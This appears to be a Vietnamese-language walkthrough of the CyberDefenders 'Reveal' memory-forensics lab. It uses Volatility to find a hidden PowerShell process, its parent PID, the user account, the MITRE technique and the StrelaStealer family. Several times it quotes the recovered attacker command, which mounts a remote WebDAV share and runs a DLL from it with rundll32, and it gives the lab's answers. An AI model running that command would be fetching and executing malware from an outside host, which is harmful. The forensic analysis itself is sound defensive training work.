author: Azaki
published: published
created: 2025-12-31
tags: CyberDefener, Lab, Endpoint Forensics

You are a forensic investigator at a financial institution, and your SIEM flagged unusual activity on a workstation with access to sensitive financial data. Suspecting a breach, you received a memory dump from the compromised machine. Your task is to analyze the memory for signs of compromise, trace the anomaly's origin, and assess its scope to contain the incident effectively.

<hr>
<p style="text-align:right; font-style:italic;">
  Author: <b>@CyberDefenders</b> 
</p>

## Q1: Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

**Yêu cầu:** Xác định process có hành vi độc hại trong memory dump.

Để xác định process đáng ngờ, trước tiên kiểm tra command line của các process đang tồn tại trong memory bằng plugin `windows.cmdline`.

Trong kết quả, `powershell.exe` thực thi command:
```powershell
powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

![Pasted image 20260816142141.png](./images/Pasted%20image%2020260816142141.png)

Command line này có nhiều dấu hiệu bất thường. PowerShell được chạy với tùy chọn `-windowstyle hidden` nhằm ẩn cửa sổ khỏi người dùng. Sau đó process truy cập remote WebDAV server tại `45.9.74.32:8888` và sử dụng `rundll32.exe` để thực thi file `3435.dll` trực tiếp từ remote path.

Những hành vi này cho thấy `powershell.exe` đang bị attacker sử dụng để thực thi second-stage payload, vì vậy đây là malicious process cần xác định

>powershell.exe

## Q2: Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?

**Yêu cầu:** Xác định Parent Process ID của `powershell.exe`.

Sử dụng `windows.pstree` hoặc `windows.pslist` để kiểm tra quan hệ PID/PPID. Trong output có dòng:
```
3692    4120    powershell.exe
```

Trong đó `3692` là PID của `powershell.exe`, còn `4120` là PPID.
![Pasted image 20260816120727.png](./images/Pasted%20image%2020260816120727.png)
Một điểm cần lưu ý là ảnh còn cho thấy `wordpad.exe` có PID `9112` và cũng có PPID `4120`. Vì vậy từ artifact hiện có chỉ có thể khẳng định **PPID của PowerShell là 4120**

>4120

## Q3: Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?

**Yêu cầu:** Xác định tên file DLL được sử dụng làm second-stage payload.

Tiếp tục kiểm tra command line của `powershell.exe`. Có thể sử dụng plugin:
```
vol -f 192-Reveal.dmp windows.cmdline --pid 3692
```

Command line thu được chứa:
```
rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

![Pasted image 20260816120733.png](./images/Pasted%20image%2020260816120733.png)

Cú pháp trên cho thấy `rundll32` được sử dụng để load DLL `3435.dll` từ remote WebDAV path và gọi exported function `entry`

>3435.dll

## Q4: Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?

**Yêu cầu:** Xác định tên directory/share được truy cập trên remote server.

Trong cùng command line, PowerShell chạy:
```
net use \\45.9.74.32@8888\davwwwroot\
```

sau đó `rundll32` truy cập:
```
\\45.9.74.32@8888\davwwwroot\3435.dll
```

![Pasted image 20260816120736.png](./images/Pasted%20image%2020260816120736.png)

Phần `davwwwroot` là thành phần directory trong UNC path được Windows WebDAV redirector sử dụng để truy cập nội dung trên WebDAV server

>davwwwroot

## Q5: What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?

**Yêu cầu:** Xác định MITRE ATT&CK Sub-Technique mô tả việc attacker sử dụng Windows utility để thực thi DLL độc hại.

Từ Q3 có thể thấy payload được thực thi bằng:
```
rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

`rundll32.exe` là utility hợp lệ của Windows dùng để load và gọi exported function trong DLL. Khi attacker lạm dụng binary này để proxy execution cho malicious code, hành vi được MITRE ATT&CK mapping vào **System Binary Proxy Execution: Rundll32**
![Pasted image 20260816140810.png](./images/Pasted%20image%2020260816140810.png)

>T1218.011

## Q6: Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?

**Yêu cầu:** Xác định user context của process `powershell.exe`.

Sử dụng plugin `windows.getsids` và lọc theo PID `3692`:
```
vol -f 192-Reveal.dmp windows.getsids --pid 3692
```

Plugin này hiển thị các Security Identifier (SID) có trong access token của process. Trong kết quả có SID của user:
```
S-1-5-21-3274565340-3808842250-3617890653-1001    Elon
```

![Pasted image 20260816120744.png](./images/Pasted%20image%2020260816120744.png)

>Elon

## Q7: Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

**Yêu cầu:** Xác định malware family của second-stage payload.

Từ command line đã phân tích ở các câu trước, có hai IOC quan trọng để pivot sang Threat Intelligence:
```
45.9.74.32:8888
3435.dll
```

Tra cứu trên **URLhaus** cho thấy URL:
```
http://45.9.74.32:8888/3435.dll
```
được ghi nhận là một malware download URL và được gắn tag `StrelaStealer
`
![Pasted image 20260816120748.png](./images/Pasted%20image%2020260816120748.png)

Mở entry chi tiết của URL có thể xác nhận host `45.9.74.32` và tag liên quan đến malware family
![Pasted image 20260816120751.png](./images/Pasted%20image%2020260816120751.png)

Kết quả này cũng phù hợp với TTP đã quan sát trong memory: các chiến dịch StrelaStealer từng sử dụng PowerShell để kết nối tới WebDAV server và thực thi DLL thông qua `rundll32`

>StrelaStealer

---

# ATTACK CHAIN

![Reveal Lab.png](./images/Reveal%20Lab.png)